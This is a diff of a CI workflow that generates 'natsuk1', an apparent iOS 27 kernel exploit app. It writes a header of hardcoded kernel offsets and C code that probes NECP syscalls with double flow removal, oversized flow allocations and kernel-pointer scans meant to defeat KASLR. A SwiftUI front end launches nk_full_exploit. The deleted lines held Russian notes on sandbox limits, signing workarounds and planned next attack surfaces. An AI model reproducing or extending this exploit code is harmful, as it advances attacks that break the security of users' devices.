@@ -25,187 +25,84 @@ jobs:
         with:
           xcode-version: "26.5"
 
-      - name: Cleanup
+      - name: Cleanup legacy
         run: |
           rm -f .github/workflows/build_and_release.yml
           rm -f .github/workflows/fix_and_test.yml
+          rm -f natsuk1/Views/SimpleList.swift
 
-      - name: Write clean entitlements
+      - name: Write nk_offsets.h
         run: |
-          cat > natsuk1/Resources/natsuk1.entitlements <<'ENT_EOF'
-          <?xml version="1.0" encoding="UTF-8"?>
-          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-          <plist version="1.0">
-          <dict>
-          </dict>
-          </plist>
-          ENT_EOF
-
-      - name: Write rules file
-        run: |
-          cat > /tmp/rules.md <<'RULES_EOF'
-
-          ## 🤖 AUTO-GENERATED RESEARCH RULES
-
-          Обновляется workflow при каждом push. **Читать первым делом.**
-
-          ### Обновлено
-          - date: 2026-09-26
-          - device: iPhone14,5 / iOS 27.0 / 24A437
-          - necp_status: **закрыт**
-          - signature_status: **ad-hoc, без привилегированных entitlements**
-
-          ### 1. NECP — ЗАКРЫТ
-
-          **Только `op=0x04` возвращает полный TLV (280-310 байт).**
-          - `op=0x03` → 1 байт (пустой header)
-          - `op=0x04` → 280-310 байт (полная структура)
-          - `op=0x10` → 0
-          - `op=0x1A` → 0
-
-          TLV содержит client_id (0x07), uuid (0x01), interfaces (0x06),
-          flags, route stats — но kptr'ов нет.
-
-          Проверено и закрыто:
-          - `op=0x05 copy_list` → -1
-          - `op=0x0C copy_parameters` → -1
-          - `op=0x0D sysctl_arena` → user VA RO, COW, не kernel
-          - `op=0x0F copy_update` → -1
-          - `op=0x13 claim` → -1
-          - `op=0x15/0x18/0x19/0x1B` → пусто/-1
-          - TLV overflow → kernel отклоняет
-          - double-free → flow обнуляется, UAF нет
-          - `add_flow` размер 0x24..0xF0, 0xF1+ → -1
-
-          **Вывод:** NECP — userspace API без примитивов. Больше не крутить.
-
-          ### 2. iOS 27 sandbox — критично
-
-          - **Blind syscall sweep 0..558** → `SIGSYS` на syscall(78).
-            Whitelist только: getpid(20), getuid(24), getgid(47), getppid(39),
-            geteuid(25), getegid(43), gettid(286), getpgid(202).
-          - **`proc_info(336)`, `csops(169)`, `task_info` flavor sweep,
-            `mach_port_names`** → `SIGKILL - CODESIGNING` от AMFI на ad-hoc.
-            Не вызывать.
-
-          ### 3. Подпись — для работы в LiveContainer
-
-          **Привилегированные entitlements (например `com.apple.private.skip-library-validation`)
-          в ad-hoc подписи дают `SIGKILL - CODESIGNING` при запуске из LC.**
-
-          Решение: **пустой `natsuk1.entitlements`** (`<dict></dict>`).
-          `ldid -S` без аргумента. Работает и в LC и через sideload.
-
-          ### 4. Сборка — грабли
-
-          - `#include <mach/mach_vm.h>` → **`error: mach_vm.h unsupported`** в iPhoneOS SDK.
-            Extern вручную:
-            ```c
-            extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t,
-                mach_vm_size_t, mach_vm_address_t, mach_vm_size_t*);
-            extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t,
-                vm_offset_t, mach_msg_type_number_t);
-            extern kern_return_t mach_vm_protect(vm_map_t, mach_vm_address_t,
-                mach_vm_size_t, boolean_t, vm_prot_t);
-            ```
-          - `TCP_KEEPINIT`, `TCP_FASTOPEN_KEY`, `SO_REUSEPORT_LF` — **не в SDK**.
-            Sweep только числами.
-          - `@MainActor` + `nonisolated(unsafe) static let shared = Foo()` → ошибка.
-            Использовать `final class Foo: ObservableObject, @unchecked Sendable`,
-            `nonisolated(unsafe) static let shared`, `private init()`.
-          - `sysctlbyname("hw.memsize")` возвращает UInt64, не строку.
-            Читать через `uint64_t out`, не `char val[]`.
-
-          ### 5. SwiftUI iOS 27
-
-          - `.overlay(RespringView())` — **никогда**. WKWebView спамит GPU → CA UAF.
-          - `List { if ... } else { ... } }` в корне → падает `optionalSelectionContainer`.
-          - `.scaleEffect()` внутри `if` → `_ConditionalContent` ломается.
-          - Мутации `@Published` из `Task {}` → race → UAF. Только `Timer`.
-
-          ### 6. Установка — и LC и sideload
-
-          - **Sideloadly / AltStore / TrollStore / ESign** — работают всегда.
-          - **LiveContainer** — работает если entitlements пустые (см. §3).
-            Ставить IPA, не .app.
-
-          ### 7. Оффсеты (iOS 27.0 / 24A437)
-
-          ```
-          necp_open                      0xFFFFFFF00A4E411C
-          necp_client_action             0xFFFFFFF00A4E5C28
-          necp_client_copy_result        0xFFFFFFF00A4E7BE8
-          necp_client_copy_result_inner  0xFFFFFFF00A4F26F0
-          necp_client_add_flow           0xFFFFFFF00A4E843C
-          necp_client_remove_flow        0xFFFFFFF00A4E93C4
-          necp_client_copy_interface     0xFFFFFFF00A4EAC7C
-          necp_client_sysctl_arena       0xFFFFFFF00A4EB704
-          necp_client_copy_update        0xFFFFFFF00A4EC264
-          necp_get_tlv_at_offset         0xFFFFFFF00A4C2034
-          copyin                         0xFFFFFFF00A368EC0
-          copyout                        0xFFFFFFF00A369A3C
-          kalloc_type                    0xFFFFFFF00A200988
-          kfree_type                     0xFFFFFFF00A201000
-          kalloc_type_necp_flow          0xFFFFFFF007C62E68
-          ```
-          KBASE = `0xFFFFFFF007004000`, slide = `0x3D00000`.
-
-          ### 8. Ghidra / CI
-
-          - Jython 2.7: только 4 пробела. Валидация `python3 -c "import ast,sys; ast.parse(...)"`.
-          - Warm = `-process -noanalysis` (1-3 мин). Cold = `-import` (24-90 мин).
-          - Ключи кэша статические: `ghidra-project-24A437-v4`. **Никогда** `hashFiles`.
-          - Символизация: `ipsw kernel symbolicate --signatures symbolicator/kernel/27.0/kexts`.
-          - Kernelcache iOS 27 — уже Mach-O. Не декомпрессировать.
-
-          ### 9. YAML
-
-          - Один workflow: `fix_and_release.yml`.
-          - C/Swift код длиннее 30 строк — в `reference/`, не в heredoc.
-          - Heredoc-строки на 10 пробелах от начала файла.
-          - `set +e` + `FAIL=1`, `grep -q -e "pattern"`.
-
-          ### 10. Что дальше
-
-          1. **mbuf / socket** — `sendmsg` + `msg_control`, неинициализированные mbuf.
-          2. **IOKit** — `IOSurface`, `IOConnectCallMethod`, `IOHIDEvent`.
-          3. **Ghidra** — `sbappendcontrol`, `m_copydata`, `sock_getsockopt`.
-
-          После 2-3 попыток — менять подход.
-
-          ### 11. Что НЕ делать
-
-          - Не создавать `fix_and_test.yml` / `build_and_release.yml`.
-          - Не пихать C/Swift в heredoc.
-          - Не использовать `hashFiles('kernelcache/**')` в кэшах.
-          - Не делать blind syscall sweep.
-          - Не вызывать `proc_info(336)`, `csops(169)`, `task_info` sweep, `mach_port_names`.
-          - Не ставить привилегированные entitlements.
-          - Не мутировать `@Published` из `Task {}`.
-          - Не класть `RespringView` в дерево SwiftUI.
-          - Не вызывать `al_device_respring`.
-          - Не коммитить `natsuk1.xcodeproj`.
-          - Не доверять оффсетам без Ghidra.
-          RULES_EOF
-
-      - name: Update README
-        run: |
-          python3 - <<'PY_EOF'
-          import re, os
-          p = "README.md"
-          s = open(p).read() if os.path.exists(p) else "# natsuk1\n"
-          rules = open("/tmp/rules.md").read()
-          ms = "<!-- AUTO-RULES-START -->"
-          me = "<!-- AUTO-RULES-END -->"
-          s = re.sub(re.escape(ms) + r".*?" + re.escape(me), "", s, flags=re.DOTALL)
-          s = s.rstrip() + "\n\n" + ms + "\n" + rules + "\n" + me + "\n"
-          open(p, "w").write(s)
-          print("README size=%d" % len(s))
-          PY_EOF
+          cat > natsuk1/Exploit/nk_offsets.h <<'NKEOF'
+          #ifndef NK_OFFSETS_H
+          #define NK_OFFSETS_H
+          #define NK_KERNEL_BASE                0xFFFFFFF007004000ULL
+          #define NK_SYSENT_BASE                0xFFFFFFF007C192A0ULL
+          #define NK_SYSENT_COUNT               558
+          #define NK_SLIDE_FALLBACK             0x3D00000ULL
+          #define NK_NECP_OPEN                  0xFFFFFFF00A4E411CULL
+          #define NK_NECP_CLIENT_ACTION         0xFFFFFFF00A4E5C28ULL
+          #define NK_NECP_ADD_CLIENT            0xFFFFFFF00A4E60DCULL
+          #define NK_NECP_REMOVE_CLIENT         0xFFFFFFF00A4E76F4ULL
+          #define NK_NECP_REMOVE_FLOW           0xFFFFFFF00A4E93C4ULL
+          #define NK_NECP_ADD_FLOW              0xFFFFFFF00A4E843CULL
+          #define NK_NECP_COPY_LIST             0xFFFFFFF00A4E80FCULL
+          #define NK_NECP_COPY_RESULT           0xFFFFFFF00A4E7BE8ULL
+          #define NK_NECP_COPY_RESULT_INNER     0xFFFFFFF00A4F26F0ULL
+          #define NK_NECP_COPY_INTERFACE        0xFFFFFFF00A4EAC7CULL
+          #define NK_NECP_COPY_UPDATE           0xFFFFFFF00A4EC264ULL
+          #define NK_NECP_SYSCTL_ARENA          0xFFFFFFF00A4EB704ULL
+          #define NK_NECP_GET_TLV_AT_OFFSET     0xFFFFFFF00A4C2034ULL
+          #define NK_NECP_FLOW_ALLOC            0xFFFFFFF00A346E70ULL
+          #define NK_NECP_HANDLER_BIG           0xFFFFFFF00A3D91B4ULL
+          #define NK_NECP_UPDATE_CACHE          0xFFFFFFF00A4EBD58ULL
+          #define NK_NECP_PER_FLOW_COPY         0xFFFFFFF00A4F2E70ULL
+          #define NK_SOOPTCOPYIN                0xFFFFFFF00A77FD2CULL
+          #define NK_SBAPPENDCONTROL            0xFFFFFFF00A788A24ULL
+          #define NK_SBAPPENDRECORD             0xFFFFFFF00A7873B8ULL
+          #define NK_SBAPPENDSTREAM             0xFFFFFFF00A78811CULL
+          #define NK_FN_COPYIN                  0xFFFFFFF00A368EC0ULL
+          #define NK_FN_COPYOUT                 0xFFFFFFF00A369A3CULL
+          #define NK_FN_KALLOC_TYPE             0xFFFFFFF00A200988ULL
+          #define NK_FN_KFREE_TYPE              0xFFFFFFF00A201000ULL
+          #define NK_KALLOC_TYPE_NECP_FLOW      0xFFFFFFF007C62E68ULL
+          #define NK_CALLER_FLOW_ALLOC_1        0xFFFFFFF00A346474ULL
+          #define NK_CALLER_FLOW_ALLOC_2        0xFFFFFFF00A348180ULL
+          #define NK_CALLER_HANDLER_BIG         0xFFFFFFF00A3D9174ULL
+          #define NK_WRAPPER_TLV                0xFFFFFFF00A4C113CULL
+          #define NK_SYSCALL_DISPATCHER         0xFFFFFFF00A6CEB84ULL
+          #define NK_NECP_OP_ADD_CLIENT         0x01
+          #define NK_NECP_OP_REMOVE_CLIENT      0x02
+          #define NK_NECP_OP_COPY_RESULT        0x03
+          #define NK_NECP_OP_COPY_RESULT_ALT    0x04
+          #define NK_NECP_OP_COPY_LIST          0x05
+          #define NK_NECP_OP_REQUEST_NEXUS      0x06
+          #define NK_NECP_OP_AGENT_ACTION       0x07
+          #define NK_NECP_OP_COPY_AGENT         0x08
+          #define NK_NECP_OP_COPY_INTERFACE     0x09
+          #define NK_NECP_OP_COPY_ROUTE_STATS   0x0B
+          #define NK_NECP_OP_COPY_PARAMETERS    0x0C
+          #define NK_NECP_OP_SYSCTL_ARENA       0x0D
+          #define NK_NECP_OP_UPDATE_CACHE       0x0E
+          #define NK_NECP_OP_COPY_UPDATE        0x0F
+          #define NK_NECP_OP_COPY_RESULT_LONG   0x10
+          #define NK_NECP_OP_ADD_FLOW           0x11
+          #define NK_NECP_OP_REMOVE_FLOW        0x12
+          #define NK_NECP_OP_CLAIM              0x13
+          #define NK_NECP_OP_SIGN               0x14
+          #define NK_NECP_OP_GET_IFACE_ADDR     0x15
+          #define NK_NECP_OP_COPY_AGENT_ALT     0x16
+          #define NK_NECP_OP_VALIDATE           0x17
+          #define NK_NECP_OP_GET_SIGNED_ID      0x18
+          #define NK_NECP_OP_SET_SIGNED_ID      0x19
+          #define NK_NECP_OP_COPY_RESULT_LONG2  0x1A
+          #define NK_NECP_OP_GET_FLOW_STATS     0x1B
+          #endif
+          NKEOF
 
       - name: Write necp.c
         run: |
-          cat > natsuk1/Exploit/necp.c <<'NECP_EOF'
+          cat > natsuk1/Exploit/necp.c <<'NECPEOF'
           #include <stdio.h>
           #include <stdlib.h>
           #include <string.h>
@@ -253,15 +150,37 @@ jobs:
           static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
           static int nadd_client(int fd, uint8_t uuid[16]) {
               uint8_t p[1] = {0};
-              return (int)syscall(SYS_NECP_ACTION, fd, 0x01, uuid, (size_t)16, p, (size_t)1);
+              return (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_ADD_CLIENT,
+                                  uuid, (size_t)16, p, (size_t)1);
           }
           static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
               uint8_t req[56]; memset(req, 0, sizeof(req));
               memcpy(req + 0x10, cu, 16);
               *(uint16_t*)(req + 0x20) = 0x0040;
-              int r = (int)syscall(SYS_NECP_ACTION, fd, 0x11, (void*)cu, (size_t)16, req, (size_t)56);
+              int r = (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_ADD_FLOW,
+                                   (void*)cu, (size_t)16, req, (size_t)56);
               if (r == 0) { memcpy(fu, req, 16); fu[9] |= 0x01; }
               return r;
+          }
+          static int nadd_flow_ex(int fd, const uint8_t cu[16], uint8_t fu[16],
+                                  uint16_t flag, size_t sz) {
+              uint8_t req[2048];
+              if (sz > sizeof(req)) sz = sizeof(req);
+              memset(req, 0, sz);
+              memcpy(req + 0x10, cu, 16);
+              *(uint16_t*)(req + 0x20) = flag;
+              int r = (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_ADD_FLOW,
+                                   (void*)cu, (size_t)16, req, sz);
+              if (r == 0 && fu) { memcpy(fu, req, 16); fu[9] |= 0x01; }
+              return r;
+          }
+          static int nrm_flow(int fd, const uint8_t fu[16]) {
+              return (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_REMOVE_FLOW,
+                                  (void*)fu, (size_t)16, NULL, (size_t)0);
+          }
+          static int ncpy_result(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
+              return (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_COPY_RESULT,
+                                  (void*)cu, (size_t)16, b, (uint32_t)bl);
           }
           static void hexdump(const char *tag, const uint8_t *buf, int len, int max) {
               if (len > max) len = max;
@@ -287,110 +206,135 @@ jobs:
           }
           static void sysctl_str(const char *key) {
               char val[256]; size_t sz = sizeof(val); memset(val, 0, sizeof(val));
-              if (sysctlbyname(key, val, &sz, NULL, 0) == 0) {
-                  LI("A2", "%s = %s", key, val);
-              }
+              if (sysctlbyname(key, val, &sz, NULL, 0) == 0) LI("SYS", "%s = %s", key, val);
           }
           static void sysctl_u64(const char *key) {
               uint64_t v = 0; size_t sz = sizeof(v);
-              if (sysctlbyname(key, &v, &sz, NULL, 0) == 0) {
-                  LI("A2", "%s = %llu", key, (unsigned long long)v);
-              }
+              if (sysctlbyname(key, &v, &sz, NULL, 0) == 0) LI("SYS", "%s = %llu", key, (unsigned long long)v);
           }
           static void sysctl_u32(const char *key) {
               uint32_t v = 0; size_t sz = sizeof(v);
-              if (sysctlbyname(key, &v, &sz, NULL, 0) == 0) {
-                  LI("A2", "%s = %u", key, v);
-              }
+              if (sysctlbyname(key, &v, &sz, NULL, 0) == 0) LI("SYS", "%s = %u", key, v);
           }
-          static int step_sysinfo(void) {
+          static void sysinfo(void) {
               TRACE("sysinfo");
               struct utsname u;
-              if (uname(&u) == 0) {
-                  LI("A1", "sysname=%s release=%s machine=%s",
-                     u.sysname, u.release, u.machine);
-                  LI("A1", "version=%s", u.version);
-              }
+              if (uname(&u) == 0) LI("SYS", "%s %s %s", u.sysname, u.release, u.machine);
               sysctl_str("kern.osproductversion");
               sysctl_str("kern.osversion");
               sysctl_str("kern.uuid");
-              sysctl_str("kern.hostname");
               sysctl_str("hw.machine");
               sysctl_str("hw.model");
               sysctl_u64("hw.memsize");
               sysctl_u32("hw.ncpu");
               sysctl_u32("hw.cpufamily");
-              sysctl_u32("hw.cputype");
-              sysctl_u32("hw.cpusubtype");
-              sysctl_str("hw.targettype");
-              return 0;
           }
-          static int step_necp_op04(void) {
-              TRACE("necp op=0x04");
+          static void necp_recap(void) {
+              TRACE("necp_recap");
               int fd = nfd();
-              if (fd < 0) { LE("B", "open errno=%d", errno); return -1; }
+              if (fd < 0) { LE("RECAP", "open errno=%d", errno); return; }
               uint8_t cu[16]; memset(cu, 0, sizeof(cu));
               nadd_client(fd, cu);
               uint8_t fu[16]; memset(fu, 0, sizeof(fu));
               nadd_flow(fd, cu, fu);
-              uint8_t buf[2048]; memset(buf, 0, sizeof(buf));
-              int c = (int)syscall(SYS_NECP_ACTION, fd, 0x04,
-                                   (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-              LI("B", "op=0x04 ret=%d", c);
-              if (c > 0 && c < 600) {
-                  hexdump("BH", buf, c, 512);
-                  scan_kptr("BK", buf, c, 8);
-              }
-              close(fd);
-              return c;
-          }
-          static int step_necp_compare(void) {
-              TRACE("necp op=0x03/0x10/0x1A");
-              int fd = nfd();
-              if (fd < 0) return -1;
-              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              nadd_client(fd, cu);
-              uint32_t ops[] = {0x03, 0x10, 0x1A};
-              for (size_t i = 0; i < 3; i++) {
+              uint32_t ops[] = {0x03, 0x04, 0x10, 0x1A};
+              for (size_t i = 0; i < 4; i++) {
                   uint8_t buf[2048]; memset(buf, 0, sizeof(buf));
                   int c = (int)syscall(SYS_NECP_ACTION, fd, ops[i],
                                        (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-                  LI("B", "op=0x%02x ret=%d", ops[i], c);
-                  if (c > 0 && c < 600) {
-                      hexdump("BH", buf, c, 128);
-                  }
+                  LI("RECAP", "op=0x%02x ret=%d", ops[i], c);
+                  if (c > 0 && c < 600) hexdump("RECAP", buf, c, 128);
+              }
+              int r1 = nrm_flow(fd, fu);
+              int r2 = nrm_flow(fd, fu);
+              LI("RECAP", "remove#1=%d remove#2=%d", r1, r2);
+              close(fd);
+          }
+          static void sysctl_arena_probe(void) {
+              TRACE("sysctl_arena");
+              int fd = nfd();
+              if (fd < 0) { LE("ARENA", "open errno=%d", errno); return; }
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
+              nadd_client(fd, cu);
+              uint64_t val = 0;
+              int rc = (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_SYSCTL_ARENA,
+                                    (void*)0, (size_t)0, (void*)&val, (size_t)8);
+              LI("ARENA", "rc=%d value=0x%llx", rc, (unsigned long long)val);
+              if (is_kptr(val)) {
+                  uint64_t slide = val - NK_KERNEL_BASE;
+                  LO("ARENA", "KERNEL POINTER! slide=0x%llx base=0x%llx",
+                     (unsigned long long)slide,
+                     (unsigned long long)(NK_KERNEL_BASE + slide));
               }
               close(fd);
-              return 0;
           }
-          static int step_getsockopt_hits(void) {
-              TRACE("getsockopt hits");
+          static void update_cache_probe(void) {
+              TRACE("update_cache");
+              int fd = nfd();
+              if (fd < 0) { LE("UPDCACHE", "open errno=%d", errno); return; }
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
+              nadd_client(fd, cu);
+              uint8_t fu[16]; memset(fu, 0, sizeof(fu));
+              nadd_flow(fd, cu, fu);
+              uint8_t req[32]; memset(req, 0, sizeof(req));
+              req[0] = 0x01;
+              req[4] = 0x01;
+              uint8_t ptr[16] = {0};
+              memcpy(req + 8, ptr, 8);
+              int r = (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_UPDATE_CACHE,
+                                   (void*)cu, (size_t)16, req, (size_t)sizeof(req));
+              LI("UPDCACHE", "op=0x0E ret=%d", r);
+              uint8_t req2[32]; memset(req2, 0, sizeof(req2));
+              req2[0] = 0x02;
+              req2[4] = 0x12;
+              memcpy(req2 + 8, ptr, 8);
+              int r2 = (int)syscall(SYS_NECP_ACTION, fd, NK_NECP_OP_UPDATE_CACHE,
+                                    (void*)cu, (size_t)16, req2, (size_t)sizeof(req2));
+              LI("UPDCACHE", "op=0x0E (0x12) ret=%d", r2);
+              close(fd);
+          }
+          static void flow_alloc_overflow_attempt(void) {
+              TRACE("flow_alloc_overflow");
+              int fd = nfd();
+              if (fd < 0) { LE("FLOWALLOC", "open errno=%d", errno); return; }
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
+              nadd_client(fd, cu);
+              uint32_t test_sizes[] = {
+                  0xF0, 0x200, 0x1000, 0x4000,
+                  0xFFFF0000, 0xFFFFFEA0, 0xFFFFFF80, 0x7FFFFFFF
+              };
+              for (size_t i = 0; i < sizeof(test_sizes)/sizeof(test_sizes[0]); i++) {
+                  uint8_t fu[16]; memset(fu, 0, sizeof(fu));
+                  size_t sz = test_sizes[i] & 0xFFFF;
+                  if (sz < 0x24) sz = 0x24;
+                  int r = nadd_flow_ex(fd, cu, fu, 0x0040, sz);
+                  LI("FLOWALLOC", "size=0x%x actual=0x%zx ret=%d",
+                     test_sizes[i], sz, r);
+              }
+              close(fd);
+          }
+          static void getsockopt_probe(void) {
+              TRACE("getsockopt");
               int s = socket(AF_INET, SOCK_STREAM, 0);
-              if (s < 0) return -1;
+              if (s < 0) { LE("SOCK", "socket errno=%d", errno); return; }
               int levels[] = {0xffff, 0, 6, 41};
               const char *names[] = {"SOL", "IP", "TCP", "IPV6"};
               for (size_t li = 0; li < 4; li++) {
-                  int hits = 0;
                   for (int opt = 0; opt <= 200; opt++) {
-                      uint8_t buf[256]; socklen_t bl = sizeof(buf); memset(buf, 0, sizeof(buf));
+                      uint8_t buf[128]; socklen_t bl = sizeof(buf); memset(buf, 0, sizeof(buf));
                       if (getsockopt(s, levels[li], opt, buf, &bl) == 0 && bl > 4) {
-                          hits++;
-                          if (hits <= 3) {
-                              LI("D", "%s opt=%d bl=%u", names[li], opt, (unsigned)bl);
-                              hexdump("DH", buf, bl, 256);
-                              scan_kptr("DK", buf, bl, 4);
-                          }
+                          LI("SOCK", "%s opt=%d bl=%u", names[li], opt, (unsigned)bl);
+                          hexdump("SOCK", buf, bl, 64);
+                          scan_kptr("SOCK", buf, bl, 4);
                       }
                   }
-                  LI("D", "%s hits=%d", names[li], hits);
               }
               close(s);
-              return 0;
           }
           static int impl(void) {
               nk_log("");
               nk_log("================================================================");
-              nk_log("natsuk1 v7.3 - FINAL");
+              nk_log("natsuk1 v8.0");
               nk_log("iOS 27.0 / iPhone14,5 / 24A437");
               nk_log("================================================================");
               nk_log("");
@@ -398,12 +342,12 @@ jobs:
               if (fd < 0) { LE("PRE", "necp_open errno=%d", errno); return 1; }
               close(fd);
               LO("PRE", "necp_open OK");
-
-              step_sysinfo();
-              step_necp_op04();
-              step_necp_compare();
-              step_getsockopt_hits();
-
+              sysinfo();
+              necp_recap();
+              sysctl_arena_probe();
+              update_cache_probe();
+              flow_alloc_overflow_attempt();
+              getsockopt_probe();
               TRACE("done");
               return 0;
           }
@@ -415,7 +359,480 @@ jobs:
               return rc;
           }
           void nk_necp_cancel(void) { g_cancel = 1; nk_log("[!] cancel requested"); }
-          NECP_EOF
+          NECPEOF
+
+      - name: Write natsuk1.swift
+        run: |
+          cat > natsuk1/natsuk1.swift <<'SWIFTEOF'
+          import SwiftUI
+          import UIKit
+          import Foundation
+          final class LockedBuffer: @unchecked Sendable {
+              static let shared = LockedBuffer()
+              private let lock = NSLock()
+              private var value: String = ""
+              private init() {}
+              func append(_ s: String) {
+                  lock.lock(); value += s + "\n"
+                  if value.count > 10000 { value = String(value.suffix(6000)) }
+                  lock.unlock()
+              }
+              func drain() -> String { lock.lock(); let v = value; value = ""; lock.unlock(); return v }
+              func clear() { lock.lock(); value = ""; lock.unlock() }
+          }
+          private let cCallback: @convention(c) (UnsafePointer<CChar>?) -> Void = { line in
+              guard let line = line else { return }
+              var bytes: [UInt8] = []
+              var p = line
+              while p.pointee != 0 { bytes.append(UInt8(bitPattern: p.pointee)); p = p.advanced(by: 1) }
+              let _line = String(decoding: bytes, as: UTF8.self)
+              LockedBuffer.shared.append(_line)
+              CrashLog.shared.writeLine(_line)
+              AppState.shared.parseLogLine(_line)
+          }
+          private func osVersionString() -> String {
+              let v = ProcessInfo.processInfo.operatingSystemVersion
+              return "\(v.majorVersion).\(v.minorVersion)"
+          }
+          private func appVersionString() -> String {
+              Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
+          }
+          @main
+          struct natsuk1App: App { var body: some Scene { WindowGroup { RootView() } } }
+          struct RootView: View {
+              @StateObject private var state = AppState.shared
+              @StateObject private var offsets = OffsetsStore.shared
+              @StateObject private var airlift = AirliftBridge.shared
+              @AppStorage("auto_run") private var auto_run = false
+              @AppStorage("keep_alive_audio") private var keep_alive_audio = false
+              @AppStorage("keep_alive_location") private var keep_alive_location = false
+              @Environment(\.scenePhase) private var scenePhase
+              init() {
+                  UserDefaults.standard.register(defaults: ["auto_run": false, "keep_alive_audio": false, "keep_alive_location": false, "lang": "en"])
+              }
+              var body: some View {
+                  ContentView()
+                      .environmentObject(state).environmentObject(offsets).environmentObject(airlift)
+                      .onAppear {
+                          CrashLog.shared.install()
+                          if let prev = CrashLog.shared.recoverPreviousSession(), !prev.isEmpty { AppState.shared.previousCrash = prev }
+                          nk_set_log(cCallback)
+                          if state.log.isEmpty {
+                              state.append("[*] natsuk1 v\(appVersionString())")
+                              state.append("[*] iOS \(osVersionString()) / arm64e")
+                              state.append("")
+                          }
+                          if keep_alive_audio { KeepAlive.shared.startAudio() }
+                          if keep_alive_location { KeepAlive.shared.startLocation() }
+                          if auto_run { DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { state.run() } }
+                      }
+                      .onChange(of: keep_alive_audio) { _, v in if v { KeepAlive.shared.startAudio() } else { KeepAlive.shared.stopAudio() } }
+                      .onChange(of: keep_alive_location) { _, v in if v { KeepAlive.shared.startLocation() } else { KeepAlive.shared.stopLocation() } }
+                      .onChange(of: scenePhase) { _, phase in if phase == .background { CrashLog.shared.markCleanShutdown() } }
+              }
+          }
+          final class AppState: ObservableObject, @unchecked Sendable {
+              static let shared = AppState()
+              @Published var slide: String = "-"
+              @Published var base: String = "-"
+              @Published var previousCrash: String? = nil
+              @Published var showCrashLog: Bool = false
+              func parseLogLine(_ line: String) {
+                  if let v = Self.extractHex(line, keys: ["slide=0x", "SLIDE = 0x", "slide = 0x"]) {
+                      if self.slide != v { DispatchQueue.main.async { self.slide = v } }
+                  }
+                  if let v = Self.extractHex(line, keys: ["base=0x", "BASE = 0x", "base = 0x"]) {
+                      if self.base != v { DispatchQueue.main.async { self.base = v } }
+                  }
+              }
+              private static func extractHex(_ s: String, keys: [String]) -> String? {
+                  for k in keys {
+                      if let r = s.range(of: k) {
+                          var hex = ""
+                          for c in s[r.upperBound...] { if c.isHexDigit { hex.append(c) } else { break } }
+                          if !hex.isEmpty { return "0x" + hex }
+                      }
+                  }
+                  return nil
+              }
+              enum Status {
+                  case idle, running, ok, failed
+                  var color: Color {
+                      switch self {
+                      case .idle: return .secondary
+                      case .running: return .orange
+                      case .ok: return .green
+                      case .failed: return .red
+                      }
+                  }
+              }
+              @Published var log: String = ""
+              @Published var status: Status = .idle
+              @Published var running: Bool = false
+              @Published var show_respring: Bool = false
+              @Published var lang: String { didSet { UserDefaults.standard.set(lang, forKey: "lang") } }
+              private var flusher: Timer?
+              private init() {
+                  self.lang = UserDefaults.standard.string(forKey: "lang") ?? "en"
+                  startFlusher()
+              }
+              func t(_ en: String, _ ru: String) -> String { lang == "ru" ? ru : en }
+              private func startFlusher() {
+                  flusher?.invalidate()
+                  flusher = Timer.scheduledTimer(withTimeInterval: 0.3, repeats: true) { [weak self] _ in
+                      guard let self = self else { return }
+                      let chunk = LockedBuffer.shared.drain()
+                      if chunk.isEmpty { return }
+                      var newLog = self.log
+                      newLog += chunk
+                      if newLog.count > 30000 { newLog = String(newLog.suffix(20000)) }
+                      self.log = newLog
+                  }
+              }
+              func append(_ s: String) { LockedBuffer.shared.append(s) }
+              func run() {
+                  if running { return }
+                  running = true; status = .running
+                  Task.detached {
+                      _ = nk_full_exploit()
+                      await MainActor.run {
+                          AppState.shared.running = false
+                          AppState.shared.status = .ok
+                      }
+                  }
+              }
+              func necp_run() {
+                  if running { return }
+                  running = true; status = .running
+                  Task.detached {
+                      let rc = nk_necp_run()
+                      await MainActor.run {
+                          AppState.shared.running = false
+                          AppState.shared.status = (rc == 0) ? .ok : .failed
+                      }
+                  }
+              }
+              func respring() {
+                  DispatchQueue.main.async {
+                      guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
+                            let window = scene.windows.first(where: { $0.isKeyWindow }) ?? scene.windows.first,
+                            let root = window.rootViewController else { return }
+                      let host = UIHostingController(rootView: RespringView().ignoresSafeArea())
+                      host.modalPresentationStyle = .fullScreen
+                      root.present(host, animated: false)
+                  }
+              }
+              func clear() { LockedBuffer.shared.clear(); log = "" }
+              func cancel() {
+                  nk_necp_cancel()
+                  append("[*] cancel requested")
+              }
+          }
+          SWIFTEOF
+
+      - name: Write entitlements
+        run: |
+          cat > natsuk1/Resources/natsuk1.entitlements <<'ENTEOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+          <plist version="1.0">
+          <dict>
+          </dict>
+          </plist>
+          ENTEOF
+
+      - name: Strip nonisolated unsafe
+        run: |
+          python3 - <<'PYEOF'
+          import re, os
+          for root, dirs, files in os.walk("natsuk1"):
+              for f in files:
+                  if not f.endswith(".swift"):
+                      continue
+                  p = os.path.join(root, f)
+                  s = open(p).read()
+                  s2 = re.sub(r"nonisolated\(unsafe\)\s+static\s+let\s+shared", "static let shared", s)
+                  if s2 != s:
+                      open(p, "w").write(s2)
